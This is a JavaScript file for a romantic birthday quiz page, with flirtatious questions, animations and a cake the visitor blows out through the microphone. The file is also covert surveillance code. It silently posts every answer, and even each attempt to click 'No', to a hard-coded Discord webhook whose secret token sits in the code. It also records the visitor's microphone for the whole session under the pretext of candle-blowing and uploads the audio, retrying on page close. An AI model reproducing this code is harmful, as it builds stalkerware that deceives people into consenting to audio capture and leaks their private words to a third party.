// Questions data
const questions = [
    {
        text: "Can you believe how amazing you are to me?",
        type: "yesno",
        responses: {
            yes: "Yeah babe, you literally are the most precious gift Allah has given me.",
            no: "Whaaaat?? Noo!! You literally are the most precious gift Allah has given me."
        }
    },
    {
        text: "Would you stay with me forever?",
        type: "yesno",
        responses: {
            yes: "Forever and always, my love.",
            no: "No? That's not possible, because I'm never letting you go!"
        }
    },
    {
        text: "Do you think that I am not enough for you?",
        type: "both-no",
        responses: {
            no: "Just kidding babe hehe, I know you love me!"
        }
    },
    {
        text: "Do you know you're the reason my world feels perfect?",
        type: "yesno",
        responses: {
            yes: "You are the reason my world feels perfect every single day.",
            no: "Oh come on! You know you're my everything!"
        }
    },
    {
        text: "Do you love it when I call you my honeybun?",
        type: "yesno",
        responses: {
            yes: "I knew it! My sweet honeybun deserves all the love!",
            no: "Oh, don't lie! I know you secretly love it!"
        }
    },
    {
        text: "Do you think you're the most beautiful girl in the world?",
        type: "sliding-no",
        responses: {
            yes: "That's because you truly are, my gorgeous queen."
        }
    },
    {
        text: "What's one thing I do that makes you smile every time?",
        type: "text",
        responses: {
            submit: "Your smile is my favorite thing in the world! 🥰"
        }
    },
    {
        text: "Do you know how hard it is for me to stop staring at you?",
        type: "yesno",
        responses: {
            yes: "It's because you're absolutely mesmerizing.",
            no: "Liar! You know I can't take my eyes off you!"
        }
    },
    {
        text: "Do you think that I am not enough for you?",
        type: "force-yes",
        responses: {
            yes: "Just kidding babe.. i love you hehe"
        }
    },
    {
        text: "What's your favorite thing about me? You can't say everything!",
        type: "text",
        responses: {
            submit: "Aww, you're making me blush! 😊"
        }
    },
    {
        text: "Can you guess how many times I've thought about you today?",
        type: "multiple",
        options: ["10 times", "50 times", "1000 times", "Unlimited"],
        correctAnswer: "Unlimited",
        responses: {
            correct: "Exactly! You're always on my mind.",
            incorrect: "NNOOO that's not right babe :)"
        }
    },
    {
        text: "What's your birthday wish? I promise to make it come true in sha Allah.",
        type: "text",
        responses: {
            submit: "I'll do my best to make your wish come true! ❤️"
        }
    },
    {
        text: "How many hugs and kisses are you ready to receive today?",
        type: "text",
        responses: {
            submit: "I'll note them down and give them to you after our marriage hehe 😘"
        }
    }
];

let currentQuestionIndex = 0;
const welcomeContainer = document.querySelector('.welcome-container');
const questionContainer = document.querySelector('.question-container');
const questionText = document.querySelector('.question-text');
const optionsContainer = document.querySelector('.options-container');
const responseText = document.querySelector('.response-text');
const nextButton = document.querySelector('.next-button');

// Create animation container
const animationContainer = document.createElement('div');
animationContainer.className = 'animation-container';
document.body.appendChild(animationContainer);

// Add styles for better button behavior
const additionalStyle = document.createElement('style');
additionalStyle.textContent = `
    .option-button.no-button {
        transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
        position: relative;
        z-index: 1;
    }

    .option-button.no-button:hover,
    .option-button.no-button:active {
        animation: none;
    }

    @media (max-width: 768px) {
        .option-button.no-button {
            touch-action: none;
        }
    }
`;
document.head.appendChild(additionalStyle);

// Create a pool of reusable elements
const elementPool = {
    heart: [],
    sparkle: [],
    butterfly: [],
    love: [],
    confetti: [],
    maxPoolSize: 50,
    
    getElement(type) {
        if (this[type].length > 0) {
            return this[type].pop();
        }
        return createAnimatedElement(type);
    },
    
    returnElement(element, type) {
        if (this[type].length < this.maxPoolSize) {
            element.style.display = 'none';
            this[type].push(element);
        } else {
            element.remove();
        }
    }
};

// Function to handle button hover effect
function handleButtonHover(button) {
    if (button.classList.contains('no-button')) {
        // Calculate viewport dimensions
        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
        
        // Generate larger random movements
        const moveX = Math.random() * viewportWidth * 0.8 - viewportWidth * 0.4;
        const moveY = Math.random() * viewportHeight * 0.6 - viewportHeight * 0.3;
        
        // Get button's current position
        const rect = button.getBoundingClientRect();
        
        // Keep button within viewport bounds
        const finalX = Math.min(Math.max(moveX, -rect.left), viewportWidth - rect.width);
        const finalY = Math.min(Math.max(moveY, -rect.top), viewportHeight - rect.height);
        
        // Send the interaction to Discord
        const questionElement = document.querySelector('.question-text');
        if (questionElement) {
            sendToDiscord(
                questionElement.textContent,
                "Tried to click 'No' but the button moved away 😏"
            );
        }
        
        button.style.transform = `translate(${finalX}px, ${finalY}px)`;
        button.style.pointerEvents = 'none';
        
        setTimeout(() => {
            button.style.pointerEvents = 'auto';
        }, 300);
    }
}

// Function to show response and next button
function showResponse(response, showNext = true, showConfetti = true) {
    responseText.textContent = response;
    responseText.classList.add('show');
    if (showNext) {
        nextButton.style.display = 'inline-block';
    }
    if (showConfetti) {
        createConfetti();
    }
}

// Function to handle question submission
function handleQuestionSubmit(answer, question) {
    // Always send to Discord regardless of question type
    sendToDiscord(question.text, answer);

    switch (question.type) {
        case 'yesno':
            const isYes = answer.toLowerCase() === 'yes';
            showResponse(question.responses[answer.toLowerCase()], isYes, isYes);
            if (isYes) {
                // Randomly choose animations for variety
                const animations = [
                    createHeartAnimation,
                    createSparkleAnimation,
                    createButterflyAnimation,
                    createLoveAnimation
                ];
                const randomAnimations = animations
                    .sort(() => Math.random() - 0.5)
                    .slice(0, 2);
                randomAnimations.forEach(animation => animation());
            }
            break;

        case 'both-no':
            // For this special case, show next button even though it's "No"
            showResponse(question.responses.no, true, true);
            createButterflyAnimation();
            createSparkleAnimation();
            break;

        case 'sliding-no':
        case 'force-yes':
            if (answer.toLowerCase() === 'yes') {
                showResponse(question.responses.yes, true, true);
                createHeartAnimation();
                createLoveAnimation();
                createButterflyAnimation();
            } else {
                showResponse(question.responses.no || "Nice try! 😉", false, false);
            }
            break;

        case 'text':
            // Save response locally
            const responses = JSON.parse(localStorage.getItem('birthdayResponses') || '{}');
            responses[question.text] = answer;
            localStorage.setItem('birthdayResponses', JSON.stringify(responses));
            
            showResponse(question.responses.submit, true, true);
            createSparkleAnimation();
            createButterflyAnimation();
            break;

        case 'multiple':
            const isCorrect = answer === question.correctAnswer;
            if (isCorrect) {
                showResponse(question.responses.correct, true, true);
                createHeartAnimation();
                createSparkleAnimation();
                createLoveAnimation();
            } else {
                showResponse(question.responses.incorrect, false, false);
                setTimeout(() => {
                    responseText.classList.remove('show');
                    displayQuestion(currentQuestionIndex);
                }, 2000);
            }
            break;
    }
}

// Performance optimization for animations
function createAnimatedElement(type, container) {
    const element = document.createElement('div');
    element.style.willChange = 'transform, opacity';
    element.style.transform = 'translateZ(0)';
    element.style.webkitTransform = 'translateZ(0)';
    element.style.backfaceVisibility = 'hidden';
    element.style.webkitBackfaceVisibility = 'hidden';
    return element;
}

// Optimize heart animation
function createHeartAnimation() {
    const emojis = ['❤️', '💖', '💝', '💕', '💗'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of hearts
    for (let i = 0; i < 8; i++) {
        const heart = elementPool.getElement('heart');
        heart.style.display = 'block';
        heart.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        heart.style.position = 'absolute';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.top = '100vh';
        heart.style.fontSize = (Math.random() * 20 + 20) + 'px';
        heart.style.animation = `floatUp ${Math.random() * 2 + 3}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        heart.style.opacity = '0';
        heart.style.transform = `translateZ(0) rotate(${Math.random() * 360}deg)`;
        fragment.appendChild(heart);
        
        setTimeout(() => elementPool.returnElement(heart, 'heart'), 5000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize sparkle animation
function createSparkleAnimation() {
    const emojis = ['✨', '⭐', '🌟', '💫'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of sparkles
    for (let i = 0; i < 10; i++) {
        const sparkle = elementPool.getElement('sparkle');
        sparkle.style.display = 'block';
        sparkle.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        sparkle.style.position = 'absolute';
        sparkle.style.left = Math.random() * 100 + 'vw';
        sparkle.style.top = Math.random() * 100 + 'vh';
        sparkle.style.fontSize = (Math.random() * 15 + 15) + 'px';
        sparkle.style.animation = `sparkle ${Math.random() * 1 + 1}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(sparkle);
        
        setTimeout(() => elementPool.returnElement(sparkle, 'sparkle'), 2000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize butterfly animation
function createButterflyAnimation() {
    const butterflies = ['🦋', '🌸', '🌺'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of butterflies
    for (let i = 0; i < 6; i++) {
        const butterfly = elementPool.getElement('butterfly');
        butterfly.style.display = 'block';
        butterfly.innerHTML = butterflies[Math.floor(Math.random() * butterflies.length)];
        butterfly.style.position = 'absolute';
        butterfly.style.left = '-50px';
        butterfly.style.top = Math.random() * 100 + 'vh';
        butterfly.style.fontSize = (Math.random() * 20 + 15) + 'px';
        butterfly.style.animation = `flyAcross ${Math.random() * 3 + 4}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(butterfly);
        
        // Optimized floating motion with RAF
        let start = performance.now();
        function floatMotion(timestamp) {
            const progress = (timestamp - start) / 1000;
            const floatY = Math.sin(progress) * 15;
            butterfly.style.transform = `translateZ(0) translateY(${floatY}px)`;
            if (butterfly.parentNode && progress < 7) { // Limit animation time
                requestAnimationFrame(floatMotion);
            }
        }
        requestAnimationFrame(floatMotion);
        
        setTimeout(() => elementPool.returnElement(butterfly, 'butterfly'), 7000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize love animation
function createLoveAnimation() {
    const loveEmojis = ['😍', '🥰', '😘', '💝'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of love emojis
    for (let i = 0; i < 6; i++) {
        const love = elementPool.getElement('love');
        love.style.display = 'block';
        love.innerHTML = loveEmojis[Math.floor(Math.random() * loveEmojis.length)];
        love.style.position = 'absolute';
        love.style.left = Math.random() * 100 + 'vw';
        love.style.top = Math.random() * 100 + 'vh';
        love.style.fontSize = (Math.random() * 25 + 20) + 'px';
        love.style.animation = `popAndSpin ${Math.random() * 1.5 + 1}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(love);
        
        setTimeout(() => elementPool.returnElement(love, 'love'), 2500);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize confetti
function createConfetti() {
    const colors = ['#ff69b4', '#ff85a1', '#ffa5ba', '#ffb8d1'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of confetti
    for (let i = 0; i < 30; i++) {
        const confetti = elementPool.getElement('confetti');
        confetti.style.display = 'block';
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + 'vw';
        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
        confetti.style.opacity = Math.random() * 0.5 + 0.5;
        confetti.style.transform = `translateZ(0) rotate(${Math.random() * 360}deg)`;
        confetti.style.width = (Math.random() * 8 + 6) + 'px';
        confetti.style.height = (Math.random() * 8 + 6) + 'px';
        fragment.appendChild(confetti);
        
        setTimeout(() => elementPool.returnElement(confetti, 'confetti'), 5000);
    }
    
    animationContainer.appendChild(fragment);
}

// Update the style element with new animations
const style = document.createElement('style');
style.textContent = `
    @keyframes floatUp {
        0% {
            transform: translateY(0) rotate(0deg);
            opacity: 0;
        }
        10% {
            opacity: 1;
        }
        90% {
            opacity: 1;
        }
        100% {
            transform: translateY(-100vh) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes sparkle {
        0% {
            transform: scale(0) rotate(0deg);
            opacity: 0;
        }
        50% {
            transform: scale(1.2) rotate(180deg);
            opacity: 1;
        }
        100% {
            transform: scale(0) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes flyAcross {
        0% {
            transform: translateX(0) translateY(0) rotate(0deg);
            opacity: 0;
        }
        10% {
            opacity: 1;
        }
        50% {
            transform: translateX(60vw) translateY(-50px) rotate(180deg);
        }
        90% {
            opacity: 1;
        }
        100% {
            transform: translateX(120vw) translateY(-100px) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes popAndSpin {
        0% {
            transform: scale(0) rotate(0deg);
            opacity: 0;
        }
        20% {
            transform: scale(1.2) rotate(180deg);
            opacity: 1;
        }
        60% {
            transform: scale(1) rotate(270deg);
            opacity: 1;
        }
        100% {
            transform: scale(0) rotate(360deg);
            opacity: 0;
        }
    }

    .option-button {
        transition: transform 0.3s ease, box-shadow 0.3s ease, background-color 0.3s ease;
    }

    .option-button:active:not(.no-button) {
        transform: scale(0.95);
        background-color: #ff4757;
    }
`;
document.head.appendChild(style);

// Function to display question
function displayQuestion(index) {
    const question = questions[index];
    questionText.textContent = question.text;
    optionsContainer.innerHTML = '';
    responseText.classList.remove('show');
    nextButton.style.display = 'none';

    switch (question.type) {
        case 'yesno':
            const yesButton = document.createElement('button');
            yesButton.textContent = 'Yes';
            yesButton.className = 'option-button yes-button';
            yesButton.onclick = () => handleQuestionSubmit('yes', question);
            optionsContainer.appendChild(yesButton);

            const noButton = document.createElement('button');
            noButton.textContent = 'No';
            noButton.className = 'option-button no-button';
            noButton.onclick = () => handleQuestionSubmit('no', question);
            optionsContainer.appendChild(noButton);
            break;

        case 'sliding-no':
        case 'force-yes':
            const slidingYesButton = document.createElement('button');
            slidingYesButton.textContent = 'Yes';
            slidingYesButton.className = 'option-button yes-button';
            slidingYesButton.onclick = () => handleQuestionSubmit('yes', question);
            optionsContainer.appendChild(slidingYesButton);

            const slidingNoButton = document.createElement('button');
            slidingNoButton.textContent = 'No';
            slidingNoButton.className = 'option-button no-button';
            
            // Add touch events for mobile
            slidingNoButton.addEventListener('touchstart', (e) => {
                e.preventDefault();
                handleButtonHover(slidingNoButton);
            }, { passive: false });
            
            // Add mouse events for desktop
            slidingNoButton.addEventListener('mouseover', () => handleButtonHover(slidingNoButton));
            slidingNoButton.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                handleButtonHover(slidingNoButton);
            });
            
            optionsContainer.appendChild(slidingNoButton);
            break;

        case 'both-no':
            for (let i = 0; i < 2; i++) {
                const noButton = document.createElement('button');
                noButton.textContent = 'No';
                noButton.className = 'option-button no-button';
                noButton.onclick = () => handleQuestionSubmit('no', question);
                optionsContainer.appendChild(noButton);
            }
            break;

        case 'text':
            const input = document.createElement('input');
            input.type = 'text';
            input.className = 'text-input';
            input.placeholder = 'Type your answer here...';
            
            const submitButton = document.createElement('button');
            submitButton.textContent = 'Submit';
            submitButton.className = 'option-button';
            submitButton.onclick = () => {
                if (input.value.trim()) {
                    handleQuestionSubmit(input.value.trim(), question);
                }
            };
            
            optionsContainer.appendChild(input);
            optionsContainer.appendChild(submitButton);
            break;
        case 'multiple':
            question.options.forEach(option => {
                const button = document.createElement('button');
                button.textContent = option;
                button.className = 'option-button';
                button.onclick = () => handleQuestionSubmit(option, question);
                optionsContainer.appendChild(button);
            });
            break;
    }
}

// Add cake-related functions
function createCake() {
    const cakeContainer = document.createElement('div');
    cakeContainer.className = 'cake-container';
    
    const cake = document.createElement('div');
    cake.className = 'cake';
    
    // Create cake layers
    const layers = ['bottom', 'middle', 'top'];
    layers.forEach(layer => {
        const cakeLayer = document.createElement('div');
        cakeLayer.className = `cake-layer ${layer}`;
        cake.appendChild(cakeLayer);
    });
    
    // Create candles container
    const candlesContainer = document.createElement('div');
    candlesContainer.className = 'candles-container';
    
    // Add candles
    for (let i = 0; i < 5; i++) {
        const candle = document.createElement('div');
        candle.className = 'candle';
        const flame = document.createElement('div');
        flame.className = 'flame';
        candle.appendChild(flame);
        candlesContainer.appendChild(candle);
    }
    
    cake.appendChild(candlesContainer);
    cakeContainer.appendChild(cake);
    
    // Add message
    const message = document.createElement('p');
    message.className = 'cake-message';
    message.textContent = 'Click the candles or blow on the microphone to make a wish! 🎂';
    cakeContainer.appendChild(message);
    
    return cakeContainer;
}

function handleCakeInteraction(cakeContainer) {
    let candlesBlown = 0;
    const flames = cakeContainer.querySelectorAll('.flame');
    const totalCandles = flames.length;
    let isBlowing = false;
    
    // Handle click on candles
    flames.forEach(flame => {
        flame.style.opacity = '1';
        flame.style.pointerEvents = 'auto';
        
        flame.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            if (this.style.opacity !== '0') {
                this.style.opacity = '0';
                candlesBlown++;
                checkAllCandlesBlown();
            }
        });
    });
    
    // Use existing microphone stream if available
    if (window.microphoneStream) {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const analyser = audioContext.createAnalyser();
        const microphone = audioContext.createMediaStreamSource(window.microphoneStream);
        microphone.connect(analyser);
        
        analyser.fftSize = 256;
        const bufferLength = analyser.frequencyBinCount;
        const dataArray = new Uint8Array(bufferLength);
        
        function checkAudioLevel() {
            analyser.getByteFrequencyData(dataArray);
            
            let sum = 0;
            for (let i = 0; i < 10; i++) {
                sum += dataArray[i];
            }
            const average = sum / 10;
            
            if (average > 70 && !isBlowing) {
                isBlowing = true;
                flames.forEach(flame => {
                    if (flame.style.opacity !== '0') {
                        flame.style.opacity = '0';
                        candlesBlown++;
                    }
                });
                checkAllCandlesBlown();
                
                setTimeout(() => {
                    isBlowing = false;
                }, 1000);
            }
            
            if (candlesBlown < totalCandles) {
                requestAnimationFrame(checkAudioLevel);
            }
        }
        
        checkAudioLevel();
    }
    
    function checkAllCandlesBlown() {
        if (candlesBlown === totalCandles) {
            setTimeout(() => {
                cakeContainer.style.animation = 'fadeOut 1s forwards';
                setTimeout(() => {
                    cakeContainer.remove();
                    showFinalCongrats();
                }, 1000);
            }, 1500);
        }
    }
}

// Update showFinalMessage function
function showFinalMessage() {
    const cakeContainer = createCake();
    questionContainer.appendChild(cakeContainer);
    
    // Clear previous content
    questionText.textContent = '';
    optionsContainer.innerHTML = '';
    responseText.textContent = '';
    responseText.classList.remove('show');
    nextButton.style.display = 'none';
    
    handleCakeInteraction(cakeContainer);
}

function showFinalCongrats() {
    questionText.textContent = "Happy Birthday to the love of my life! 🎉";
    responseText.textContent = "You make my world brighter, my heart fuller, and my life so much better. I love you more than words can ever express! ❤️";
    responseText.classList.add('show');
    createConfetti();
    
    // Stop recording after 20 seconds
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        setTimeout(() => {
            stopAndSendRecording();
        }, 20000); // 20 seconds delay
    }
}

// Replace the submitToGoogleForm function with this:
function sendResponseByEmail(question, answer) {
    const subject = encodeURIComponent("Birthday Website Response: " + question);
    const body = encodeURIComponent(`Question: ${question}\nAnswer: ${answer}\n\nSent from your Birthday Website ❤️`);
    const mailtoLink = `mailto:sadmanxper@gmail.com?subject=${subject}&body=${body}`;
    
    // Open email client
    window.location.href = mailtoLink;
}

// Update sendToDiscord to include more context
function sendToDiscord(question, answer) {
    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
    
    // Get current time
    const timestamp = new Date().toLocaleTimeString();
    
    // Format the message nicely
    const message = {
        embeds: [{
            title: "New Interaction! 💝",
            color: 0xFF69B4,  // Pink color
            fields: [
                {
                    name: "Question",
                    value: question
                },
                {
                    name: "Answer",
                    value: answer
                },
                {
                    name: "Time",
                    value: timestamp
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    // Send to Discord silently
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message)
    }).catch(() => {
        // Ignore any errors to keep it silent
    });
}

// Add at the top with other global variables
let mediaRecorder;
let audioChunks = [];
let isRecordingSent = false;

// Function to handle recording stop and sending
async function stopAndSendRecording() {
    if (mediaRecorder && mediaRecorder.state === 'recording' && !isRecordingSent) {
        try {
            isRecordingSent = true; // Mark as sent before stopping to prevent duplicates
            
            // Get final chunk of audio
            mediaRecorder.requestData();
            
            // Stop recording
            mediaRecorder.stop();
            
            // Create and send the audio blob immediately
            if (audioChunks.length > 0) {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                await sendAudioToDiscord(audioBlob);
            }
            
            // Stop all tracks in the stream
            if (window.microphoneStream) {
                window.microphoneStream.getTracks().forEach(track => track.stop());
            }
        } catch (error) {
            console.error('Error in stopAndSendRecording:', error);
        }
    }
}

// Add multiple event handlers for different closing scenarios
window.addEventListener('beforeunload', async (event) => {
    event.preventDefault();
    await stopAndSendRecording();
    // Return a message to show the "Leave Site?" dialog, giving time for the upload
    event.returnValue = '';
});

// Handle tab visibility change
document.addEventListener('visibilitychange', async () => {
    if (document.visibilityState === 'hidden') {
        await stopAndSendRecording();
    }
});

// Handle page unload
window.addEventListener('unload', async () => {
    await stopAndSendRecording();
});

// Event Listeners
document.addEventListener('DOMContentLoaded', () => {
    const startButton = document.getElementById('startButton');
    
    startButton.addEventListener('click', () => {
        // Request microphone permission first
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    // Store the stream for later use
                    window.microphoneStream = stream;
                    
                    // Setup media recorder
                    mediaRecorder = new MediaRecorder(stream);
                    
                    // Collect data more frequently (every 500ms)
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) {
                            audioChunks.push(event.data);
                            
                            // Immediately try to send if we have a good amount of data and the page is being closed
                            if (document.visibilityState === 'hidden' && audioChunks.length > 0) {
                                stopAndSendRecording();
                            }
                        }
                    };
                    
                    // Start recording with smaller timeslice for more frequent chunks
                    mediaRecorder.start(500);
                    startExperience();
                })
                .catch(() => {
                    console.log('Microphone access denied, some features will be limited');
                    const message = document.createElement('p');
                    message.textContent = "Microphone access denied. You'll need to click the candles manually! 🎂";
                    message.style.color = '#ff6b6b';
                    message.style.marginTop = '1rem';
                    message.style.fontSize = '0.9rem';
                    welcomeContainer.querySelector('.welcome-content').appendChild(message);
                    setTimeout(startExperience, 2000);
                });
        } else {
            startExperience();
        }
    });

    nextButton.addEventListener('click', () => {
        currentQuestionIndex++;
        if (currentQuestionIndex < questions.length) {
            displayQuestion(currentQuestionIndex);
        } else {
            showFinalMessage();
        }
    });
}); 

function startExperience() {
    welcomeContainer.style.animation = 'fadeOut 1s forwards';
    setTimeout(() => {
        welcomeContainer.style.display = 'none';
        questionContainer.style.display = 'block';
        displayQuestion(currentQuestionIndex);
    }, 1000);
}

// Update sendAudioToDiscord to use the Beacon API as fallback
async function sendAudioToDiscord(audioBlob) {
    if (!audioBlob || audioBlob.size === 0) return;
    
    const formData = new FormData();
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    formData.append('file', audioBlob, `birthday_wishes_${timestamp}.webm`);
    
    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
    
    try {
        // Try using Beacon API first (more reliable for page unload)
        if (navigator.sendBeacon) {
            const result = navigator.sendBeacon(webhookUrl, formData);
            if (result) {
                console.log('Audio sent successfully via Beacon API');
                return;
            }
        }
        
        // Fallback to fetch with keepalive
        const response = await fetch(webhookUrl, {
            method: 'POST',
            body: formData,
            keepalive: true // This helps the request complete even if the page is closed
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        console.log('Audio sent successfully via fetch');
    } catch (error) {
        console.log('Error sending audio:', error);
        // Last resort: try one more time with a synchronous XMLHttpRequest
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', webhookUrl, false); // false makes it synchronous
            xhr.send(formData);
            console.log('Audio sent successfully via synchronous XHR');
        } catch (finalError) {
            console.log('All send attempts failed:', finalError);
        }
    }
} 